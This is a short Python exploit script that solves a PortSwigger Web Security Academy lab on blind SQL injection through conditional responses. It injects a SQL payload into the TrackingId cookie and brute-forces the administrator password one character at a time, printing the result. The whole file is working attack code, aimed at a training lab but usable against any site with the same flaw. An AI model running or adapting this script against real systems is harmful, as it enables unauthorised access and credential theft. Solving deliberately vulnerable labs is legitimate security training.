import argparse
import requests
import string

#https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-exploiting-blind-sql-injection-by-triggering-conditional-responses/sql-injection/blind/lab-conditional-responses#
def main(url):
    admin_password = ''
    password_chars = string.ascii_lowercase + string.digits + '~!@#$%^&*()+-/'
    for i in range(1, 21):
        for j in password_chars:
            payload = f"'+OR+(SELECT+SUBSTRING(password,{i},1)+FROM+users+WHERE+username='administrator')='{j}"
            cookies = {"TrackingId": payload}
            response = requests.get(url, cookies=cookies)
            found_char = j
            if "welcome back" in response.text.lower():
                admin_password += found_char
                print(f"{i}, character {j}")
    print("administrator password: " + admin_password)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Blind SQL Injection Exploit Script')
    parser.add_argument('-u', '--url', help='URL argument')
    args = parser.parse_args()

    if args.url:
        main(args.url)
    else:
        print("Please provide a URL using the -u or --url option.")
